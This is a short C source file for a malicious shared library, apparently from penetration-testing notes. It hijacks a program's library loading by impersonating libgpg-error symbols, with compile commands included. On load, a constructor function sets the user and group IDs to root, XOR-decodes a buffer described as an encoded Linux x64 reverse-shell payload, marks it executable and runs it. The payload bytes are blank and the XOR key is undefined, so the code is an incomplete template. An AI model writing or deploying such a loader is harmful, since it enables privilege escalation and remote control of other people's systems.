#include <sys/mman.h>
#include <stdlib.h>
#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>

// Compile as follows
//gcc -Wall -fPIC -z execstack -c -o hax.o hax.c
//gcc -shared -o hax.so hax.o -ldl

static void runmahpayload() __attribute__((constructor));

int gpgrt_onclose;
// [...output from readelf here...]
int gpgrt_poll;

void runmahpayload() {
//encoded 'linux/x64/shell_reverse_tcp' payload
char buf[] = "";
        setuid(0);
        setgid(0);
        printf("Library hijacked!\n");
        int buf_len = (int) sizeof(buf);
        for (int i=0; i<buf_len; i++)
        {
                buf[i] = buf[i] ^ key;
        }
        intptr_t pagesize = sysconf(_SC_PAGESIZE);
        mprotect((void *)(((intptr_t)buf) & ~(pagesize - 1)), pagesize, PROT_READ|PROT_EXEC);
        int (*ret)() = (int(*)())buf;
        ret();
}
